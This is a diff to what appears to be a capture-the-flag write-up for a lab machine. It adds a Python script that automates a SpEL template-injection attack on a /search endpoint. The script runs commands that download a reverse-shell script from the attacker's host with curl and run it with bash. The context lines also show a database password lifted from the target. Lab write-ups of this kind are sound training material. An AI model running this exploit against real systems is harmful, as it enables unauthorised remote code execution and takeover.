@@ -287,6 +287,33 @@ Copy the output of step 1 and step 2 to use with `Burp Repeater`.
 ![[step2_burp_repeater.png]]
 
 We got the revershell. Well.
+Lets try to automate full process with `auto_exploit.py`
+```python
+#!/usr/bin/python3  
+import requests
+IP = '10.10.11.170'  
+port = '8080'  
+command = ['whoami','curl -o /tmp/rev.sh http://10.10.14.10:8088/rev.sh', 'bash /tmp/rev.sh']  
+def convert_to_char(c):  
+    payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('  
+    payload2 = ''  
+    payload = payload + "T(java.lang.Character).toString(%s)" % ord(c[0])  
+    for i in range(1, len(c)):  
+        char = ""  
+        # print(ord(i))  
+        char = ord(c[i])  
+        payload2 = ".concat(T(java.lang.Character).toString(%s))" % char  
+        payload = payload + payload2  
+  
+    payload = payload + ").getInputStream())}"  
+    return(payload)  
+  
+for c in command:  
+    d = {'name': convert_to_char(c)}  
+    url = 'http://%s:%s/search' % (IP,port)  
+    r = requests.post(url,data = d)  
+    print(r.status_code)
+```
 
 The `user.txt` flag:
 ```
@@ -300,3 +327,4 @@ Binary file ./target/classes/com/panda_search/htb/panda_search/MainController.cl
 ./src/main/java/com/panda_search/htb/panda_search/MainController.java:            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
 woodenk@redpanda:/opt/panda_search$
 ```
+
